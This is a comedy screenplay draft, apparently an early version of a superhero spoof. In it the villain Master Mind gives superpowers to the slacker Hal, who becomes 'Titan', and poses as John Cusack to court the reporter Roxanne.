MASTER MIND                 It\'s plain and simple.                 Extraordinary minds need                 extraordinary stimulation. Without                 that stimulus they wither and die.                 Therefore, there is only one                 logical conclusion: I must create a                 new superhero.                                  EINSTEIN                 Yeah, maybe that\'s not such hot                 idea...

ABANDONED METRO CITY LIBRARY   - LABORATORY - DAY              The lab is slick, white and ultra modern.              Dressed in a lab coat, Master Mind enters through a SLIDING       GLASS DOOR rubbing his hands excitedly.                                  MASTER MIND                 Prepare the subject.              He glances down into a large HOLE in the floor to see a naked       thirty year old man, SEVERS, shivering. Above the hole, a       huge vat dangles precariously.              Master Mind steps behind a glass partition next to Plato and       Einstein.                                  MASTER MIND (CONT\'D)                 Plato, pour the toxic waste.              Plato throws a switch causing the vat to tip hundreds of       gallons of green and brown goo into the hole.                                    MASTER MIND (CONT\'D)                 Drainage.              The slime is sucked out through the floor, leaving a goo-       soaked Severs.                                                                 33.                            Master Mind looks into the pit.                                  MASTER MIND (CONT\'D)                 Well, Severs?                                  SEVERS                 I feel fine. Just a little sticky,                 but aside from that everything\'s                 completely -              BOOM - Severs explodes. A hail of blood and tissue covers       Master Mind and his men. For a good ten seconds nobody moves       an inch. Finally...

ABANDONED METRO CITY LIBRARY   - LABORATORY - DAY              The next guinea-pig, STENWICK, is standing in a sealed glass       tube not much wider than himself.                                  MASTER MIND                 Plato, the radioactive spider,                 please.              Plato throws the switch DROPPING A SINGLE SPIDER onto       Stenwick\'s arm.              Stenwick looks and winces as it bites him.                                  STENWICK                 Ow!              He brushes the spider off.

Master Mind thinks for a moment, then turns to Plato.                                  MASTER MIND                 We\'re gonna need more venom.              Plato throws another switch, this time DUMPING THOUSANDS OF       SPIDERS on poor Stenwick. His SCREAMS begin to fade as he\'s       engulfed with swarms of crawling arachnids.

MASTER MIND                 This has proven to be a challenge.                 I just don\'t know what I want.

MASTER MIND (CONT\'D)                 I want a man of moral fiber with a                 strong sense of right and wrong.                 Someone who doesn\'t seek power -                 instead, they must have it thrust                 upon them and find, within                 themselves, the courage to rise to                 the occasion.              Einstein lets out a short laugh, getting everyone\'s       attention.                                  EINSTEIN                 Yeah, well, it sounds like what you                 want is Uberman.              Master Mind snaps the fingers of his non-metal hand.                                  MASTER MIND                 That\'s it! Why make a copy when the                 real thing will do?

In case                 you forgot, you actually burned                 Uberman alive.                                  MASTER MIND                 Then we\'ll make a new one.

Plato places a STAINLESS STEEL CHEST in the tables center.              As Master Mind opens it, he\'s immediately doused in WHITE       GLOW emanating from inside.                                  MASTER MIND                 Behold - Uberessence. The very                 thing that gave Uberman his                 superhuman powers.                                                               36.

I\'m not sure why I never                 got around to following up with                 that.                                  PLATO                 I believe he defeated you before                 you could, master.                                  MASTER MIND                 ...Right.

CITY STREET - DAY                                  PLATO                 Then you are absolutely going to                 love this -              We follow Plato\'s line of sight across the street where we       see HAL PLAYING WITH A LARGE GROUP OF BLIND CHILDREN.                                  PLATO                 - He volunteers at a school for the                 blind.              INT. MASTER MIND\'S HIDEOUT - DAY              Intrigued, he suddenly sits up in his chair.                                  MASTER MIND                 He volunteers. He doesn\'t ask for                 any reward for his deeds. The fates                 are shining down on me. This Mr.                 Stewart is truly an unselfish soul.              EXT. BLIND SCHOOL - DAY              From a distance, Hal seems to be consoling an upset child       who\'s sitting on a rock. But up close...                                  HAL                 You greedy little bastard. I                 already gave you a twenty.                                  BLIND KID                 Hey, you want me to play along?                 Then pay up, bitch!                                                               38.                                                HAL                 Fine, but you better be convincing.              He gives the kid a bill out of his wallet and looks over his       shoulder to see a HOT TEACHER walking toward them.                                  HAL                 Here she comes, go to work.              Like a miniature Brando, the blind kid buries his face in his       hands and begins to cry.                                  BLIND KID                     (weeping)                 Why can\'t I see! Why God?              Hal puts a warm consoling hand on the weeping boy\'s shoulder.                                  HAL                 Hey, Peter. C\'mon champ, let me                 look at you.              The Hot Teacher stops and curiously watches from a distance.              The boy looks up at Hal, tears running down his dark       sunglasses - he should get an Oscar.                                  HAL                 You know, in life we\'re all given                 no more than we can bear. This                 happened to you maybe because you                 were meant to rise above it - Maybe                 to be an inspiration to the other                 little Peteys out there.                                  BLIND KID                 You really think so, Hal?                                  HAL                 Hey, does it LOOK like I\'m lying?                 Now c\'mon, go feel your way to                 class before you get your little                 butt suspended.              The boy stands up and is about to take off.                                  HAL                 Petey, wait a minute.              Hal uses his shirt sleeve to wipe the tears away from the       boy\'s face before sending him on his way.                                                                39.                            The Hot Teacher grabs her chest. Her heart is about to       absolutely melt.                                  HAL                 Don\'t run into anything!              EXT. STREET - CONTINUOUS              Plato lowers his binoculars. From his perspective, Hal should       be next in line for popehood.                                  PLATO                 I think I\'ve seen enough, sir. This                 is your guy.                                  MASTER MIND (O.S.)                     (over radio)                 Then return to base. We have much                 work to do.              Plato starts up the van and pulls away.              INT. BAR - DAY              It\'s a busy night. A couple of trucker types are shooting       pool as the bartender slings drinks.              Hal is nursing a beer at the bar when he suddenly notices a       very ATTRACTIVE WOMAN sitting next to him.              As he goes to straighten his stool-posture, Hal suddenly       catches himself on the bar\'s TELEVISION - it\'s a story about       how he saved the woman and her baby at the construction site.              He turns back to the Attractive Woman next to him, then back       to the TV. A plan of attack is forming.                                  HAL                     (obviously playing it up                      for the woman\'s benefit)                 Oh, there it is again. This is                 really getting embarrassing now.              The woman looks up at the screen and gives Hal a double-take.                                  ATTRACTIVE   WOMAN                 Oh my God! It\'s you!   You\'re the man                 who saved that woman   and her baby                 the other day! It is   you, isn\'t it?              TRUCKER #1, getting a drink at the bar next to them,       OVERHEARS.                                                                40.                            Hal rolls his eyes and puts his hands up in the air.                                  HAL                     (to Attractive Woman)                 Oh, crap. You got me.              TRUCKER#1 taps Hal on the shoulder.                                  TRUCKER#1                 Let me tell you something. That was                 just about the bravest damn thing                 I\'ve ever witnessed. (he turns to                 the rest of the bar) Hey,                 everybody! This guy\'s the hero from                 TV!              The bar ERUPTS IN CHEERS.              MOMENTS LATER              Hal is riding on the shoulders of TRUCKER#2 and TRUCKER#3 as       `I\'m Holding Out For A Hero\' plays on the jukebox.              TRUCKER#1 suddenly puts his hands in the air. The room       quickly goes silent.                                  TRUCKER#1                 I want to give you something.              He reaches into his pocket and takes out a medal. He holds it       up in the air for everyone to see.                                  TRUCKER#1 (CONT\'D)                 Lost my whole platoon. They were a                 lot a good boys, a lot of good                 boys. That was just the way things                 were in ""The Grenada."" I\'d rather a                 real hero have this.              Trucker#1 gives the medal to a speechless Hal.                                  ATTRACTIVE WOMAN                 Hey, you\'re on TV again.              The crowd looks up at the Television.              TELEVISION - CONTINUOUS              The anchor man, BRAD HELMS (early 40\'s, amazing mustache),       suddenly has a memo passed to him.                                                                  41.                                                BRAD HELMS                 This just in. Upon a second look at                 that tape from this morning, which                 we\'ll now replay for you, it                 appears it was not the heroic act                 it first seemed to be.              The tape shows Hal running in slow motion.                                  BRAD HELMS (O.S.) (CONT\'D)                 With the tape slowed down you can                 actually see the man push the woman                 and her child out of the way in an                 effort to save his own life.              The tape shows Hal, in a clear act of self-preservation,       pushing the woman and child out of the way.                                                        CUT BACK TO:              INT. BAR - CONTINUOUS              In unison, everyone turns their heads back to Hal.                                  HAL                 I guess that looks kinda bad.              Trucker#1 snatches his medal back.              EXT. NEARBY ROOF - NIGHT              Master Mind, Da Vinci and Plato look down, spotting Hal       cutting through a dark alley.                                  DA VINCI                 There he is, boss.              Da Vinci hands Master Mind a fantastic looking silver rifle.                                  MASTER MIND                 Now, we\'re sure this won\'t kill                 him?                                  PLATO                 Yes, sir. He\'ll just feel a slight                 electrical shock.                                  MASTER MIND                 Good.              Master Mind raises the rifle and aims it at Hal.                                                                 42.                            EXT. ALLEY - NIGHT              Hal wipes the blood from his nose with his shirtsleeve.              A LIGHTENING BOLT suddenly zaps Hal in the back. His teeth       spark and arc electrons as his entire body shakes and       shudders violently. He finally collapses, knocking over a row       of garbage cans.              EXT. NEARBY ROOF - NIGHT              An angry Master Mind slaps Plato.                                  MASTER MIND                 Slight electrical shock?              EXT. ALLEY - NIGHT              Hal lies flat on his back, his jacket smoldering.              Dazed, he slowly rises to his feet and looks up at the sky.                                  HAL                 God, I hate the weather in this                 city.              Hal walks off into the night as he attempts to slap the       emitting smoke from his jacket.              EXT. NEARBY ROOF - NIGHT              Master Mind turns to Da Vinci.                                  MASTER MIND                 Follow him.              INT. HAL\'S APARTMENT - NIGHT              It\'s a dirty, small studio. Laundry lies everywhere, dishes       are piled in the sink and the litter box looks like a       minefield.              Hal comes staggering in. Through his POV we see the lights       wobble and streak like a hallucination.              He shakes his head trying to clear thing up, but it looks       worse.              Hal makes his way to the kitchen table and plops down on a       chair. The room begins to swim.              His CAT jumps on the table and sits down in front of him.                                                                  43.                            From Hal\'s POV the cat\'s face looks like we\'re seeing it       through a kaleidoscope. Hal seems fascinated by it.                                   CAT                  You don\'t look so good, man.                                   HAL                  I don\'t feel good. I was struck by                  freaking lightening.              Suddenly Hal realizes his cat\'s talking to him.                                   HAL (CONT\'D)                  AAAAAAHHHHH! You can talk?                                   CAT                  No, you\'re just hallucinating. By                  the way, we\'re out of orange juice.                                   HAL                  AAAAAAHHHHH!              Hal jumps up, trips over a cardboard box and knocks himself       out on the coffee table.              INT. HAL\'S APARTMENT - MORNING              Hal lies in the same position we left him last night.              He sits up and grabs his head. He looks like he has the worst       hangover in the world.              Finally, he remembers last night. He looks around, but not       really sure what he\'s looking for.                                   HAL                  Man...              Shaking his head, he walks to the kitchen and opens the       refrigerator.              He pulls out an orange juice container and puts it to his       mouth. It\'s empty.              As if suddenly remembering something he looks from the carton       to the cat, who is busy cleaning himself.              He shakes the thought from his mind.              BATHROOM              Hal lifts the seat and unbuckles his pants.                                                               44.                            HAL\'S FACE              He stares at the ceiling with half closed eyes. The       inevitable sound of urine hitting water starts. A content       look washes over his face.              There is a distinct sound of porcelain CRACKING and       SPLINTERING.              The sound intensifies. Hal looks down to see his URINE STREAM       SMASHING THE TOILET.                                      HAL (CONT\'D)                    Oh, God!              He whips his stream away only to cut a LONG RIP IN THE WALL.                                      HAL (CONT\'D)                    Oh, God!              He freaks out and begins to lose control of his flow as it       destroys everything he accidently aims at; the bathroom       mirror, a bottle of cheap cologne, the bathroom window.                                      HAL (CONT\'D)                    Oh, God!              He aims back for the toilet, which is pretty much rubble now,       to see the floor give way.              Finally, the pee stops and he glances down the hole.              He sees his downstairs NEIGHBOR sitting at his breakfast       table. He has a fork halfway to his mouth as he stares at the       smashed toilet on his pancakes.              EXT. STREET - DAY              Hal turns the corner to see his bus pulling away from the       stop.                                      HAL                    Wait!              He starts running after it.              ZOOM - HE TAKES OFF LIKE LIGHTENING.                                     HAL (CONT\'D)                    Whoa, whoa, whoa!              Unable to stop, he SLAMS INTO THE BACK OF THE BUS and falls       back to the ground.                                                                  45.                            As the bus continues on he sees an INDENTATION of his torso       right below the rear window.              Stunned, to say the least, he rises to his feet.                                  HAL (CONT\'D)                 Something\'s not right here.              He slaps himself in the face as hard as he can.                                  HAL (CONT\'D)                 Wake up! Wake up, Hal!              HONK!              Hal spins around to see a car barreling toward him.              He goes to jump out of the way - ZOOM - he FLIES TWO STORIES       UP, nails a building and comes crashing back down to the       sidewalk.              Hal sits up, disheveled and scared.                                  HAL (CONT\'D)                 Okay, okay. Let\'s get it together,                 man.              He closes his eyes in an attempt to will back his sanity.                                  HAL (CONT\'D)                 This is just some sort                 of...episode. It will pass, it will                 pass.              He opens his eyes and looks down the street. A BEAUTIFUL       NAKED WOMAN is coming toward him.                                  HAL (CONT\'D)                 Well, not too fast I hope.              As she passes him and turns the corner out of his view he       catches ANOTHER NAKED WOMAN - an old disgusting one.                                  HAL (CONT\'D)                 Yes, fast, fast!              He turns away from her in horror only to see AN ENTIRE BLOCK       OF NAKED PEOPLE going about their business.              He rubs his eyes and looks down the street again. Everyone       has returned to a clothed state.                                                               46.                            He relaxes a little until he looks down and notices that he\'s       floating a foot off the ground.                                  HAL (CONT\'D)                 I think I need to go home.              INT. HAL\'S APARTMENT - DAY              Hal\'s front door CREAKS as it slowly opens, revealing Master       Mind.              He walks over to the bathroom and smiles to himself as he       notices the giant hole in the floor.                                  MASTER MIND                 Welcome to your second birth, Hal                 Stewart.              Master Mind continues to survey the room. He stops to look       over a ""KARATE KID"" POSTER on Hal\'s living room wall.              He focuses on the majestic image of Pat Morita teaching a       young Ralph Macchio to kick.                                  MASTER MIND (CONT\'D)                 Instruction is very important in                 the formative years. Every hero                 needs a mentor, a father figure to                 look up to.              He presses his special watch, causing his body to MORPH INTO       THE SPITTING-IMAGE OF PAT MORITA.                                   ""PAT MORITA""                 Perfect.              INT. HAL\'S APARTMENT - DAY              Hal enters, grabs a bottle of vodka from atop of the fridge       and takes a long pull from it.                                  VOICE (O.S.)                 A man will usually find that if he                 drinks from a bottle, eventually,                 the bottle drinks from him.              Hal does a SPIT TAKE. In the corner a darkened figure stands.                                  HAL                 Who are you!?                                                                 47.                                                VOICE                 I am the guide on your journey.                 Fate has chosen you to be it\'s                 champion.              Pat Morita steps out from the shadows.              Hal passes out again.              LATER              We are close on Hal\'s face as his eyes flutter open. He       appears to be lying on the couch.              He hunches up on his elbows, looks around, but everything is       as it seems.              He lays his head back down.                                  HAL                 Thank God. It was a dream. Man, I                 must be losing it.              A voice sounds right next to his ear.                                  ""PAT MORITA"" (O.S.)                 You know you\'re out of orange                 juice?              Hal leaps up to find he\'s been resting his head on Pat\'s lap.                                  HAL                 Jesus! This isn\'t happening, this                 isn\'t happening.              Hal backs away and trips over a box.                                  ""PAT MORITA""                 Calm. All things must be filtered                 through calmness.                                   HAL                 Bullshit! Sometimes it\'s best to                 freak out.                                  ""PAT MORITA""                 I think we must work on your                 attitude first.                                  HAL                 Look I\'m gonna call the cops in                 about two seconds if you don\'t get                 out of here.                                                               48.                            Pat rises and walks to Hal. He\'s so calm it makes Hal calm.                                  ""PAT MORITA""                 Are you calm now?                                  HAL                 Yeah, I\'m okay.              Pat slaps him across the face hard.                                  ""PAT MORITA""                 Good, because we\'ve got a lot of                 work to do.              Hal grabs his jaw.                                  HAL                 What the hell was that for?                                  ""PAT MORITA""                 Rule number one: expect the                 unexpected.                                   HAL                 Can you just tell me what this is                 all about?                                  ""PAT MORITA""                 The heavens are not in the habit of                 bestowing a gift such as this to                 just anyone. You are being rewarded                 for being a man of great moral                 fortitude with an unwavering belief                 in humanity.                                  HAL                 That\'s me alright.                                  ""PAT MORITA""                 I am to train you so you may                 fulfill your destiny to defeat the                 great menace to Metro City: Master                 Mind.              Pat gets up and walks toward the door.                                   ""PAT MORITA"" (CONT\'D)                 Come.                                  HAL                 We\'re are we going?                                                               49.                                                   ""PAT MORITA""                 To train.              EXT. PAT\'S CAR - DAY              Pat is sitting in the driver\'s seat. The car is bumping up       and down.                                  ""PAT MORITA""                 Strength is just as much in the                 mind as it is the muscle. Remember,                 both need to be exercised.              We PULL BACK to see Hal lifting the car up over his head.       He\'s hardly straining.                                  HAL                 I\'M LIFTING A FREAKING CAR!!!              Pat leans on the HORN.                                  ""PAT MORITA""                 Hey, Corky? You listening?              Two highly attractive female joggers run by. They\'re clearly       impressed with Hal\'s show of strength. He smiles and mouths a       ""hello.""                                  HAL                 Yeah, work both muscles.              EXT. DESERT - DAY              Pat cocks back the chamber of a .357 MAGNUM. He holds it up       and carefully takes aim...at Hal\'s chest.                                     ""PAT MORITA""                 Trust me.                                  HAL                 What are you doing!?                                  ""PAT MORITA""                 An invulnerability test. Something                 wrong?                                  HAL                 Uh...yeah. I would prefer not to                 get shot. Do not fire that thing!              Frustrated, Pat lowers the gun.                                                                50.                                                ""PAT MORITA""                 You\'re bulletproof.                                  HAL                 Okay, do you know that for sure?              Pat quickly aims and fires.              Hal lets out a high pitched scream as the bullet ricochets       off his chest.                                    ""PAT MORITA""                 I do now.              Hal looks down at his chest, not so much as a scratch.                                    HAL                 You suck.              EXT. SKY - DAY              Hal is in the air flying in a sitting position. He\'s weaving       back and forth.                                  HAL                 Ice Man, I got a bogie on my tail.                 Two Russian Migs coming in hard and                 fast.                                    ""PAT MORITA""                 Hey!                                    HAL                 What?              Hal looks down to see Pat Morita yelling at him from the roof       of a building down below.                                  ""PAT MORITA""                 What did I tell you? Stomach down,                 hands up.              Hal sighs and assumes the proper superhero in-flight       position.                                  HAL                 God, I feel so gay.              Pat\'s CELL PHONE begins to RING. He answers it.                                  ""PAT MORITA""                     (in Master Mind voice)                 What is it?                                                               51.                                                ROXANNE (V.O.)                 John?              Pat panics. He looks up to make sure no one is in earshot.              He sees Hal now doing somersaults in the air.                                  HAL                 YEEEE HAWWWW!              Pat turns his attention back to the phone, talking in his       John Cusack voice.                                  ""PAT MORITA""                     (in Cusack voice)                 Yes, it\'s John Cusack.                                   ROXANNE (V.O.)                 Hi, it\'s Roxanne. Listen, I...I                 really enjoyed talking with you the                 other day.                                  ""PAT MORITA""                 ...As did I.                                  ROXANNE (V.O.)                 Great. God, I feel really silly,                 and if you have a lot going on I                 totally understand. But, I was                 wondering if you maybe wanted to                 have lunch.              He can\'t believe what he\'s hearing.                                  ""PAT MORITA""                     (excited)                 I\'d love to!              He quickly recovers his composure.                                  ""PAT MORITA"" (CONT\'D)                 I mean, I AM a little hungry.                                  ROXANNE (V.O.)                 Great. How does the park sound,                 around noon-ish?                                  ""PAT MORITA""                 Sure!                                  ROXANNE (V.O.)                 Great, see you then.                                                               52.                            Pat hangs up the phone and returns it to his pocket as Hal       lands behind him.                                  HAL                 WHOOOOA! Man, that is so cool. It\'s                 like fly - Oh my God, I almost said                 it was like flying.                                  ""PAT MORITA""                 For the rest of the day I want you                 to continue to practice your flying                 posture.                                  HAL                 Why, where\'re ya going?                                  ""PAT MORITA""                 ...To do something...mysterious                 ...and Asian.                                  HAL                 Say no more, bro. I\'ll just keep at                 it, then.              EXT. PARK - DAY              John Cusack and Roxanne eat WRAPPED SANDWICHES while walking       through Metro City Park.                                  ROXANNE                 How\'s your sandwich?                                  ""JOHN CUSACK""                 It\'s quite delicious.                                  ROXANNE                 Hope you don\'t think I\'m too                 forward. Some men are intimidated                 when a woman asks them out. I just                 find you really easy to talk to.                                     ""JOHN CUSACK""                 And I you.                                  ROXANNE                 You know, you\'re not at all like                 you are in the movies.                                     ""JOHN CUSACK""                 I\'m not?                                                               53.                                                ROXANNE                 Yeah. I don\'t know - You have this                 strange, refined way of speaking.                                  ""JOHN CUSACK""                 I do? That is most interesting.                                   ROXANNE                 Anyway, when we were talking the                 other day I just felt, even though                 we only talked for a couple of                 hours, that we\'ve known each other                 for years.                                  ""JOHN CUSACK""                 I know just what you mean.              Roxanne bites into her sandwich.                                  ROXANNE                 You know what? This sandwich is                 disgusting.              She tosses it in a nearby garbage can.                                   ROXANNE (CONT\'D)                 Of course I already ate half of it.                 I wonder what that says about my                 character?                                  ""JOHN CUSACK""                 It means you don\'t give up on a                 sandwich. You see that it has                 potential, and you give it every                 chance to be all it can be.              Roxanne smiles at his analogy.                                  ROXANNE                 Thanks, but knowing me, I was                 probably projecting my expectations                 of what a lunch should be on the                 sandwich. It might have been okay                 at first, but I just made it                 bitter.              John Cusack notices Roxanne\'s smile starting to fade.                                  ""JOHN CUSACK""                 Is that what happened with your                 last sandwich - I mean, boyfriend?                                                               54.                                                ROXANNE                 When I look back, I probably                 shouldn\'t of expected so much from                 him. He was already a giving                 person. You know, one of those go                 out and save the world types.                                  ""JOHN CUSACK""                 I\'ve run into a few.                                  ROXANNE                 I was selfish, I guess. I didn\'t                 want to share him with anybody                 else.                                  ""JOHN CUSACK""                 It sounds like he was a special                 man.                                  ROXANNE                 They broke the mold.              John Cusack arches his eyebrow in a very familiar manner.                                  ""JOHN CUSACK""                 Perhaps not.              INT. ABANDONED WAREHOUSE - DAY              Hal walks up to Pat Morita sporting a Lone Ranger-type mask       and wearing a purple and red superhero costume. It\'s not       unlike Uberman\'s except for a giant ""T"" on his chest. (From       here on, Hal is referred to as TITAN)                                  TITAN                 What\'s the ""T"" stand for?                                  ""PAT MORITA""                 Titan.                                  TITAN                 What\'s that supposed to mean?                                  ""PAT MORITA""                 It\'s from Roman mythology. Zeus\'s                 father...oh, just go with it. You                 look perfect.                                  TITAN                 I don\'t think this mask is big                 enough. Are you sure no one is                 gonna recognize me?                                                                55.

""PAT MORITA"" (CONT\'D)                 It is time.              INT. BANK - DAY              There is a long line of people snaked around the velvet       ropes. They\'re all waiting for their chance at the one open       teller window.              Four men wearing BEATLES MASKS(JOHN,PAUL,GEORGE,AND RINGO)and       CARRYING SHOTGUNS enter the bank.              John fires a shot in the air, sending everyone into an       immediate panic.                                  JOHN                 Alright folks, this is a robbery.                 Nobody moves - yadda, yadda,                 yadda...              Ringo jumps over the teller wall and starts stuffing bills       into a bag.              As John and Paul cover the crowd, George goes to the corner       office and puts a gun to the BANK MANAGER\'S head.                                  GEORGE                 The safe. Let\'s go.                                  BANK MANAGER                 Okay, just don\'t hurt anyone.                                  GEORGE                 Yeah, yeah, yeah.              George leads him out by the collar.              CRASH - Titan smashes through the window and lands in a bold       superhero stance with hands on hips.                                  TITAN                 Well, boys, there\'s no need for all                 this just to get the free toaster.              Paul cocks his gun.                                                                  56.                                                PAUL                 What are you suppose to be?              We move in for a nice dramatic close up.                                    TITAN                 Justice.                                  GEORGE                 Well, justice, suck on this...              George, John and Paul open fire on Titan.              He just stands there and yawns as the bullets bounce off him.              With their guns empty the three just stare at him in       amazement.                                  TITAN                 Now it\'s my turn.              He turns to George.                                  TITAN (CONT\'D)                 Hey, George, here comes the sun.              Titan grabs George and throws him into a fluorescent light       fixture in the ceiling.              Paul tries to run for the door. Titan snatches the collar of       his jacket.                                  TITAN (CONT\'D)                 Say, Paul, your mother should                 know...that you\'re a scumbag.              He tosses Paul out the window and into a parked DELIVERY       TRUCK.              Titan turns around just as John hits him with the butt of his       shotgun. It instantly breaks apart in his hands.              Titan lifts him like a rag doll up into the air.                                  TITAN (CONT\'D)                 John, all you need is love...              He throws John who lands on top of a cubical wall - GROIN       FIRST.                                  TITAN (CONT\'D)                 ...and a good urologist.                                                               57.                            Titan effortlessly hops over the teller wall to find Ringo       cowering on the floor.              He grabs him by the shirt and lifts him up.                                  HAL                 Well, Ringo...um...um...you\'re                 under arrest.              EXT. BANK - DAY              Titan walks out of the bank with Ringo and George under his       arm. He\'s suddenly swarmed by a group of television       reporters, including Roxanne.              Across the street is Pat Morita. He watches Titan\'s first       news conference with great anxiety.                                  BANK MANAGER                     (to Hal)                 On behalf of the First National                 Bank of Metro City, I\'d like to                 offer you a reward for your act of                 bravery.              He hands Titan a check.                                  TITAN                     (reading)                 Ten thousand dollars!

Law and                 order is it\'s own...um...reward.              Pat gives him the thumbs up. Pat turns, suddenly seeing       Roxanne with her camera crew. Captivated, his eyes lock on       her.              Meanwhile, Roxanne and her cameraman, SETH, are maneuvering       around the crowd to get closer to Titan.                                  BRAD HELMS (O.S.)                 Not so fast, Roxanne.              They both turn to see Roxanne\'s reporter rival Brad Helms,       Geraldo without the class, and his cameraman, FRANK.                                  BRAD HELMS                 This story\'s mine.                                                                  58.                                                ROXANNE                 Listen, Brad. We were just in the                 area. I was just trying to -                                  BRAD HELMS                 I\'ve been in this business long                 enough to know pretty well what you                 were ""just trying to do."" Besides,                 I heard you couldn\'t take the big                 game anymore and were put on fluff                 detail?              Dejected, Roxanne turns and motions for Seth to turn the       camera off.                                  SETH                 You\'re not gonna take that from                 him, are you?                                  ROXANNE                 He\'s right. Old habit, I guess.                     (to Brad)                 We\'ll get out of your way.              As they walk off, Brad makes a comment to Frank loud enough       for her to hear.                                  BRAD HELMS                 Besides, I\'m sure there\'s a pancake                 supper somewhere that needs                 covering.              INT. ABANDONED METRO CITY LIBRARY   - OFFICE - DAY              ON TELEVISION              We see the news conference on the bank\'s steps.

Well, it appears they won\'t have to                 hold out for much longer as a new                 costumed crusader has suddenly                 stormed onto the scene. Today, at                 the Metro Savings and Trust, a                 masked mystery man single-handedly                 defeated ""The Fab Four Gang."" Just                 who is this new caped avenger?

TITAN                 It\'s a message to all the scum out                 there. Uberman may be gone, but                 Metro City has a new protector, and                 his name is ""Tighten!""              Another reporter leans in.                                  REPORTER                 How do you spell that?              We PULL BACK to see Plato and Da Vinci watching this       spectacle. Master Mind is sitting with them, reading a       NEWSPAPER.                                  MASTER MIND                     (reading paper)                 Oh, for heaven\'s sake. I can\'t                 believe it. He misspelled his name.              Master Mind holds up the newspaper. The headline reads       ""Metro\'s New Hero: Tighten.""                                  MASTER MIND (CONT\'D)                 No matter, I suppose.              Master Mind throws the paper on the floor and begins to pace       around the room with his arms folded behind his back.                                  MASTER MIND (CONT\'D)                 We\'ve now fully established Titan                 as Metro City\'s hero. They will                 love him just as they loved                 Uberman. Everything is going                 according to plan.              Einstein leans over and whispers in Plato\'s ear.                                  EINSTEIN                     (whispering)                 Yeah, if the plan is getting us in                 jail.              Master Mind turns around, facing Einstein. He walks over,       standing face to face with the rebellious henchmen.                                                               60.                                                MASTER MIND                 You know, Einstein, maybe I should                 have called you Socrates. He also                 didn\'t know when to keep his                 thoughts to himself.                                   EINSTEIN                 I just fail to see the point in all                 of this. I mean, why are we                 creating another superhero when it                 was such a pain in the ass for you                 to get rid of the other one? I                 mean, Uberman is destroyed, we                 should be using this opportunity                 to...to...                                    MASTER MIND                 To what?                                  EINSTEIN                 I don\'t know. To take over the                 weather, space, the world -                 whatever super villains are                 SUPPOSED to do.                                  MASTER MIND                 The reason someone like you will                 always be a minion is because you                 have no foresight. We take over the                 earth, like you said. Then what?                 Women? Cars? Money? Even the                 grandest treasures will lose their                 lustre if you don\'t have someone to                 hold them over.              Einstein throws up his hands. He\'s had enough. He pulls off       his wig and throws it to the floor.                                  EINSTEIN                 That\'s it! This balance of the                 force bullshit is getting way too                 Oprah for me. I\'m blowing. Who\'s                 with me?                                    MASTER MIND                 You dare?                                  EINSTEIN                 Yeah, I dare. I\'m sick of wearing                 stupid costumes, and I\'m sick of                 working for a super villain who\'s                 turning into a softie.                                                               61.                            Plato and Da Vinci\'s mouths drop to the floor. They turn to       Master Mind for his rebuttal.                                  MASTER MIND                 What - did - you - call me?                                  EINSTEIN                 You heard me. You used to be an                 inhuman monster, now look at you.                 You\'re creating super heroes, you                 don\'t go with us on robberies                 anymore, it\'s been days since you                 threatened anyone, oh, and not to                 mention this Roxanne Ritchi thing.                                  MASTER MIND                 THAT is none of your business,                 knave!                                  EINSTEIN                 Hey, you guys haven\'t sealed the                 deal yet, have you?                                   MASTER MIND                 Silence!                                  EINSTEIN                     (In a woman\'s voice)                 Oh, Master, your head is so big.                                  MASTER MIND                 I\'m warning you, Einstein.                                  EINSTEIN                     (In a woman\'s voice)                 Take me!                                  MASTER MIND                 I said silence!              With his metal gauntlet Master Mind grabs Einstein by the       throat and lifts him into the air.              Einstein looks frightened as he tries to pry himself free of       Master Mind\'s grip.              Master Mind\'s eyes soften as if his heart is suddenly not       into what he\'s about to do. He let\'s Einstein drop to the       floor.                                  MASTER MIND (CONT\'D)                 Get out of my sight.                                                                62.                            EXT. RESTAURANT - NIGHT              Roxanne and John Cusack are eating on the outside patio of a       fancy restaurant.                                  ROXANNE                 Don\'t get me wrong, I love being a                 reporter. I don\'t think I could do                 anything else. It\'s the                 consequences of what we do that I\'m                 having a problem with.              He listens intently as he refills her glass with wine.                                  ""JOHN CUSACK""                 That\'s where journalistic                 responsibility comes in, no?                                  ROXANNE                 It\'s supposed to.                                  ""JOHN CUSACK""                 Sounds to me like you\'re running                 from something.                                  ROXANNE                 I got someone I cared about killed.                 If it wasn\'t for me, he wouldn\'t                 have been involved.              John suddenly gets a disturbed look in his eye, realizing       what she\'s talking about.              He reaches across the table and takes her hand.                                  ""JOHN CUSACK""                 You can\'t blame yourself. My father                 used to say each of us must answer                 the great call to truly feel alive.                                  ROXANNE                 Was he an actor?                                  ""JOHN CUSACK""                 ...No. He was...a landscaper. And a                 horrible one. I mean he would fail                 time and time again at                 his...landscaping. And sometimes                 he\'d get pretty beaten up or thrown                 in jail -                                  ROXANNE                 Jail?                                                               63.                                                ""JOHN CUSACK""                 My point is he took the good with                 the bad. He grew a little each                 time. Improved, learned.                                  ROXANNE                 Was he ever successful?                                  ""JOHN CUSACK""                 God, no...but don\'t let deter you.              Roxanne LAUGHS.                                  ROXANNE                 Thanks for this. You know, this is                 embarrassing, but it\'s been a long                 time since I -              It\'s starting to lightly sprinkle. Roxanne looks up.                                  ROXANNE (CONT\'D)                 I think it\'s starting to rain. We                 might want to find a table inside.                                  ""JOHN CUSACK""                 What were you gonna say?                                  ROXANNE                 Oh, I was gonna say...It\'s been a                 long time since...well, I\'ve been                 with someone I...enjoy being with.              John Cusack smiles warmly and raises his glass for a toast.                                  ""JOHN CUSACK""                 To people who enjoy being with each                 other.              They go to clang glasses, when the rain suddenly causes John       Cusack\'s disguise generator to short.              His true form of Master Mind is briefly revealed to Roxanne       as a BOLT OF ELECTRICITY encircles his body.              Roxanne drops her glass and jumps out of her seat.                                  MASTER MIND (CONT\'D)                 Oh, no. Don\'t look at me.              LIKE A BROKEN TV the image keeps switching between MASTER       MIND AND JOHN CUSACK.                                                               64.                            As Master Mind starts to franticly slap at his watch, the       Cusack disguise begins to hold steady.              He nonchalantly returns to cutting his steak.                                  ""JOHN CUSACK""                 Okay, never mind that. Now, where                 were we?              Roxanne grabs his glass and throws the drink in his face,       causing the generator to short out permanently.              Master Mind now sits in his true blue form.                                     ROXANNE                 Oh my God.                                  MASTER MIND                 You\'re not gonna get all freaky                 about this, are you?                                  ROXANNE                 This...this is too much, even for                 you. God, I go out with you, tell                 you my innermost thoughts.                                  MASTER MIND                 I only did this because I wanted to                 talk to you on the same level. You                 know, without all the baggage?                                  ROXANNE                 Baggage? You burned my boyfriend                 alive, you sick son-of-a-bitch!                                  MASTER MIND                 You see, 